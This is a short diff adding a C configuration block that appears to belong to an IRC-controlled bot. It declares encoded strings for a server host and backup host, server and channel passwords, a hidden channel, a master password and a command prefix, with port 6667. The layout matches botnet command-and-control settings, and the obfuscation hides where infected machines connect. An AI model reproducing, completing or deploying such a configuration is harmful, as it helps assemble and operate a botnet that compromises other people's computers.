@@ -1,0 +1,12 @@
+char cfg_host[] = "ygwphm{vjmpm&ame";
+char cfg_bhost[] = "ygwphm{vjmpm:,agm";
+char cfg_srvpass[] = "Idkieqmawzk|q";
+unsigned short cfg_port = 6667;
+char cfg_channel[] = "#fmva`gv";
+char cfg_chanpass[] = "idmtevg`g{gk}pgl";
+char cfg_hiddenc[] = "#iqgcpmva`cffgn";
+char cfg_hiddenp[] = "idmtevg`gnwkckloscde";
+char cfg_protectp[] = "ieqcfg";
+char cfg_password[] = "ievjeqidg{vo}{kftjgf}aiiloumznlomvee=";
+char cfg_p[] = "!";
+char cversion[] = "593743yg3h79hg3943g";
